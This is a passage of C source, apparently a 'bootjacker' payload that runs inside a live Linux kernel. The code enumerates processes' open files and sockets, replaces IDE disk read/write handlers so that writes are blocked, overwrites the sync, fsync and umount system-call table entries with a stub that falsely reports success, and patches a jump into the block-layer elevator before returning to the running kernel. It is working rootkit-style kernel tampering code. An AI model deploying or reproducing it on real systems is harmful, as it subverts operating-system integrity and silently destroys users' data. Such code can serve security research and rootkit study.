					printk("  fd %d -- currfd=%x, path=", i, curr_fd);
					print_dentry(curr_fd->f_dentry);
					printk("\n");
					if(S_ISSOCK(curr_fd->f_dentry->d_inode->i_mode))
					{
						sock = sock_from_file(curr_fd, &err);
						sk = sock->sk;
						if(err != ENOTSOCK)
							print_sock(sk);
						else
							printk("Not a socket! %x\n", sock);
					}
				}
			}
		}

		task = next_task(task);
		if(((void*)task) == kk_init_task)
			break;
	}
}

struct disk_hook_data {
    void *rw_disk_fn[4];
    asmlinkage int (*printk)(const char * fmt, ...) __attribute__ ((format (printf, 1, 2)));

    char write_str[20];
    char read_str[20];
    char busy_str[20];
    char sync_caught_str[20];
};

//#define DISK_DEBUG 1
#define DISK_DEBUG 1

/** the replacement (hook) rw function **/
void bootjacker_rw_disk(ide_drive_t *drive, struct request *rq)
{
#if DISK_DEBUG
    void (*s_dump_stack)(void) = (void*)kk_dump_stack;
    struct disk_hook_data *data = (struct disk_hook_data *)DISK_HOOK_DATA;
#endif

    if(rq->cmd_flags & REQ_RW)
    {
#if DISK_DEBUG
        (data->printk)(data->write_str, rq->sector);
	s_dump_stack();
#endif
        //block disk write
        drive->hwif->hwgroup->busy = 1;
    }
    else
    {
#if DISK_DEBUG
        (data->printk)(data->read_str, rq->sector);
#endif
    }

    //TODO:need to change rq to a benign request (e.g. a read?)
    return;
}

/** a "null" syscall that returns 0 **/
asmlinkage long sys_success(void)
{
    struct disk_hook_data *data = (struct disk_hook_data *)DISK_HOOK_DATA;
    (data->printk)(data->sync_caught_str);
    return 0;
}

void sync_hook_setup(void)
{
    void **int_table = (void *)kk_sys_call_table;

    //overwrite all sync system calls
    int_table[SYSCALL_BDFLUSH] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_SYNC] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_FSYNC] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_FDATASYNC] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_SYNC_FILE_RANGE] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_UMOUNT] = (void*)SYS_SUCCESS_LOC;
    int_table[SYSCALL_OLDUMOUNT] = (void*)SYS_SUCCESS_LOC;

    memcpy((void *)SYS_SUCCESS_LOC, (void *)sys_success, SYS_SUCCESS_SIZE);
}

struct request *elv_kill_write(struct request *rq)
{
    struct disk_hook_data *data = (struct disk_hook_data *)DISK_HOOK_DATA;
    (data->printk)(data->busy_str);

    if(rq->cmd_flags & REQ_RW)
    {
        rq = NULL;
    }
    return rq;
}

void elevator_hook_setup(void)
{
    int jump_relative_addr = ((int)ELEVATOR_HOOK_ASM - (int)(ELEVATOR_HOOK_TARGET + 5));

    char hook_addr0 = (char)(jump_relative_addr);
    char hook_addr1 = (char)(jump_relative_addr >> 8);
    char hook_addr2 = (char)(jump_relative_addr >> 16);
    char hook_addr3 = (char)(jump_relative_addr >> 24);
    char jump_cmd[5];

    //install functions in kernel space
    memcpy((void*)ELEVATOR_HOOK_ASM, (void*)elv_next_req_hook, ELEVATOR_HOOK_SIZE);
    memcpy((void*)ELEVATOR_KILL_WRITE, (void*)elv_kill_write, ELEVATOR_KW_SIZE);

    //insert jump into elv_next_request()
    jump_cmd[0] = (char)(0xe8); //call
    jump_cmd[1] = hook_addr0;  //is this the correct endianness?
    jump_cmd[2] = hook_addr1;
    jump_cmd[3] = hook_addr2;
    jump_cmd[4] = hook_addr3;

    printk("jump from Hook Target: %x\n", (void *)ELEVATOR_HOOK_TARGET);
    printk("jump to Hook Code: %x\n", (void *)ELEVATOR_HOOK_ASM);
    printk("kill write location: %x\n", (void*)ELEVATOR_KILL_WRITE);
    printk("jump distance: %x\n", (void *)jump_relative_addr);
    printk("jump command: %hx %hx %hx %hx\n", hook_addr0, hook_addr1, hook_addr2, hook_addr3);

    memcpy((void*)ELEVATOR_HOOK_TARGET, (void*)jump_cmd, 5);
}

void wwan2_disk_hook_setup(void)
{
    int i;
    ide_hwgroup_t *disk;
    ide_hwif_t *h;
    ide_hwif_t *s_ide_hwifs = (void*) kk_ide_hwifs;

    struct disk_hook_data *data = (struct disk_hook_data *)DISK_HOOK_DATA;
    long *s_ratelimit_pages = (long*) kk_ratelimit_pages;

    *s_ratelimit_pages = 1024*1024*200;

    for(i = 0; i < MAX_HWIFS; i++)
    {
        h = &(s_ide_hwifs[i]);
        if(h)
        {
            disk = h->hwgroup;
            if(disk && disk->drive)
            {
                //hook the disk! keep old function in data
                memcpy((void *)((data->rw_disk_fn) + i), (void*)(h->rw_disk), sizeof(void*)); 
                h->rw_disk = (void *)DISK_HOOK_LOC;
                printk("Disk hook installed on %s(%d,%d)\n", h->name, h->major, h->index);
            }
        }
    }

    data->printk = (void *)lookup_sym("printk");

    strncpy(data->write_str, "write sect %d\n", 20);
    strncpy(data->read_str, "read sect %d\n", 20);
    strncpy(data->busy_str, "start write kill\n", 20);
    strncpy(data->sync_caught_str, "sync caught\n", 20);

    memcpy((void *)DISK_HOOK_LOC, (void *)bootjacker_rw_disk, DISK_HOOK_SIZE);

    sync_hook_setup();
    //elevator_hook_setup();
}

void run_payload(void)
{
	//dump_hex((void*)(kk_hardirq_stack + 0xec0), 400);
	//while(1);
	terminator();
	//jeffjacker();
	//wwan2_hello();
	//wwan2_lsfd();
    	wwan2_disk_hook_setup();

        /* jump back to the live kernel */
	restore_cpu();
}

#define __ISA_IO_base ((char __iomem *)(PAGE_OFFSET))
#define VGABASE         (__ISA_IO_base + 0xb8000)

static int max_ypos = 25, max_xpos = 80;
static int current_ypos = 25, current_xpos = 0;

void early_vga_write(const char *str)
{
        char c;
        int  i, k, j;
	int n = 100;

        while ((c = *str++) != '\0' && n-- > 0) {
                if (current_ypos >= max_ypos) {
                        /* scroll 1 line up */
                        for (k = 1, j = 0; k < max_ypos; k++, j++) {
                                for (i = 0; i < max_xpos; i++) {
                                        writew(readw(VGABASE+2*(max_xpos*k+i)),
                                               VGABASE + 2*(max_xpos*j + i));
                                }
                        }
                        for (i = 0; i < max_xpos; i++)
                                writew(0x720, VGABASE + 2*(max_xpos*j + i));
                        current_ypos = max_ypos-1;
                }
                if (c == '\n') {
                        current_xpos = 0;
                        current_ypos++;
                } else if (c != '\r')  {
                        writew(((0x7 << 8) | (unsigned short) c),
                               VGABASE + 2*(max_xpos*current_ypos +
                                                current_xpos++));
                        if (current_xpos >= max_xpos) {
                                current_xpos = 0;
                                current_ypos++;
                        }
                }
        }
}

